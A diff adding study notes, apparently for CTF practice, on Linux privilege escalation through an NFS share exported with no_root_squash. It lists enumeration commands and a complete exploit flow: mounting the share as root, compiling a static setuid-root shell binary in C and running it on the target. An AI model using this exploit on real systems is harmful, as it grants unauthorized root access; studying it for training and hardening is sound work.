@@ -466,3 +466,118 @@ For more information and a practical guide, [click here](/Offensive_Security/Lin
 
 ---
 
+# Linux Privilege Escalation — Study Notes
+
+---
+
+## Privilege Escalation: NFS
+
+### What is NFS?
+
+NFS (Network File System) allows a server to share directories over the network so other machines can mount and access them as if they were local. Configuration is stored in `/etc/exports` on the server.
+
+### Why is it a Privesc Vector?
+
+The key misconfiguration is **`no_root_squash`**.
+
+By default, NFS uses **root squashing** — if a remote user connects as root, their requests are mapped to a nobody/anonymous user on the server. This prevents remote root from having local root access.
+
+`no_root_squash` disables this — a remote root user retains root privileges on the mounted share. Combined with the ability to create SUID binaries, this leads to local privilege escalation.
+
+### Enumeration
+
+**On target (low-priv shell):**
+
+```bash
+cat /etc/exports
+```
+
+Look for shares with `no_root_squash`:
+
+```
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+**On Kali:**
+
+```bash
+showmount -e <TARGET_IP>
+```
+
+If mount fails silently, check:
+
+```bash
+# verify rpcbind is running
+sudo systemctl status rpcbind
+sudo systemctl start rpcbind
+
+# mount with verbose output
+sudo mount -v -t nfs <TARGET_IP>:/tmp /tmp/nfs
+```
+
+### Exploit Flow
+
+**1. Mount the share on Kali as root:**
+
+```bash
+mkdir /tmp/nfs
+sudo mount -o rw <TARGET_IP>:/tmp /tmp/nfs
+```
+
+**2. Create a malicious SUID binary on the mounted share:**
+
+```bash
+cat << 'SHELL' > /tmp/nfs/shell.c
+#include <unistd.h>
+#include <stdlib.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    return 0;
+}
+SHELL
+
+gcc /tmp/nfs/shell.c -o /tmp/nfs/shell -static
+chmod +s /tmp/nfs/shell
+```
+
+**3. Execute on target:**
+
+```bash
+/tmp/shell
+whoami  # root
+```
+
+### Key Principles
+
+**Root is required for mounting and creating the SUID binary**
+
+The exploit relies on Kali-side operations being done as root for two reasons:
+
+- `mount` requires root to attach network filesystems
+- The SUID binary must be owned by root with the `+s` bit set — only root can create a root-owned file. If created as a normal user, the SUID bit won't grant root on the target
+
+This is why `no_root_squash` is the critical misconfiguration — it allows Kali root to act as root on the server's filesystem. With default root squashing, even mounting as root gets mapped to nobody.
+
+**GLIBC version mismatch**
+
+Binaries compiled on Kali are dynamically linked by default — they expect the same glibc version at runtime as was available during compilation. Kali typically has a newer glibc than the target:
+
+```
+./shell: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.34' not found
+```
+
+Fix with `-static` flag — bundles all required libraries into the binary, making it independent of the target's glibc:
+
+```bash
+gcc shell.c -o shell -static
+```
+
+Static binaries are significantly larger but in CTF/THM contexts this doesn't matter.
+
+
+For more information and a practical guide, [click here](/Offensive_Security/Linux_Privilege_Escalation/Linux_Privesc_Writeup_NFS.md).
+
+---
